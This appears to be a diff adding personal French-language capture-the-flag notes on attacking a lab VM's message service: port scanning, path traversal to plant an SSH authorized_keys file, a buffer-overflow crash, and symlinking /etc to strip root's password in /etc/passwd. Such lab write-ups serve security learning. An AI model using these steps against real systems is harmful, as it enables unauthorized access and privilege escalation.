@@ -1,0 +1,122 @@
+- la machine est en 192.168.46.3/31
+- on met la kali en 192.168.46.2/31
+
+- on scan les ports d'ouverts
+
+$ sudo nmap -p 1-65535 192.168.46.2
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-03-05 08:32 EST
+Nmap scan report for 192.168.46.2
+Host is up (0.00038s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+2300/tcp open  cvmmon
+MAC Address: 08:00:27:A6:FF:3D (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 19.98 seconds
+
+- nc 192.168.46.2 2300
+enter a recipient?
+toto
+enter a title?
+caca
+enter a message body?
+hello
+This user does not exist!
+
+- il faut se mefier des chown car cela signifie que root tourne 
+- ici quand on choisit bob comme recipient cela ecrit un fichier dans 
+/home/bob/msgs/[titre]
+- read_message est au plus 1024 caracteres
+et strcpy est utilisé 
+- .ssh/authorized_keys est utilise
+
+nc 192.168.46.2 2300
+enter a recipient?
+alice
+enter a title?
+.ssh/authorized_keys
+enter a message body?
+dede
+
+un fichier /home/alice/msgs/.ssh/authorized_keys
+
+si on modifie le nbox_dir on pourrait creer un fichier dans /home/alice/.ssh/authorized_keys
+
+nc 192.168.46.2 2300
+enter a recipient?
+alice
+enter a title?
+coucou
+enter a message body?
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+SEGMENTATION FAULT
+
+char user[16];
+char title[32];
+char body[256];
+char mbox_dir[32];
+
+$ ssh-keygen -t ecdsa -f blah
+Generating public/private ecdsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in blah.
+Your public key has been saved in blah.pub.
+The key fingerprint is:
+SHA256:KnGSVqPjkaYFieqBmiLmWSQ14H3jS/x2AtHz8pEOHCQ clement@kali
+The key's randomart image is:
++---[ECDSA 256]---+
+| .   E .         |
+|..o.  +          |
+|..o+ +o+         |
+|o ..==+.+ .      |
+|oo .%=.+S+       |
+|o.+*.*+.= .      |
+|=o..o..+ +       |
+|= o  .. o        |
+| o               |
++----[SHA256]-----+
+$ ls -lsqa
+total 36
+4 drwxr-xr-x 2 clement clement 4096 Mar  5 09:09 .
+4 drwxr-xr-x 4 clement clement 4096 Mar  5 08:02 ..
+4 -rw------- 1 clement clement  557 Mar  5 09:09 blah
+4 -rw-r--r-- 1 clement clement  174 Mar  5 09:09 blah.pub
+4 -rw-r--r-- 1 clement clement  749 Mar  5 08:03 enonce.txt
+4 -rw-r--r-- 1 clement clement   96 Mar  5 08:02 group
+8 -rw-r--r-- 1 clement clement 4867 Mar  5 08:02 smsd.c
+4 -rw-r--r-- 1 clement clement 2012 Mar  5 09:09 solution.txt
+
+ecriture de message.txt
+user: alice
+title: authorized_keys
+body: [contenu du fichier]
+
+ssh -i blah alice@192.168.46.2 
+Enter passphrase for key 'blah': 
+[599] Mar 05 14:20:15 lastlog_perform_login: Couldn't stat /var/log/lastlog: No such file or directory
+[599] Mar 05 14:20:15 lastlog_openseek: /var/log/lastlog is not a file or directory!
+   ( '>')
+  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
+ (/-_--_-\)           www.tinycorelinux.net
+
+alice@box:~$ 
+
+
+malheureusement on ne peut tjrs pas ouvrir le flag
+
+il faut s'interesser a /etc/password, /etc/shadow, /root/.ssh
+
+un lien symbolique vers /root/flag
+ln -s /etc/ /home/alice/msgs/
+alice@box:~/msgs$ cp etc/passwd ./passwd2
+cp etc/passwd2 etc/passwd -> ne fonctionne pas 
+vi etc/passwd
+root::0:0:root:/root:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/false
+tc:x:1001:50:Linux User,,,:/home/tc:/bin/sh
+alice:x:1000:1000:Alice,,,:/home/alice:/bin/sh
+bob:x:1002:1002:Bob,,,:/home/bob:/bin/sh
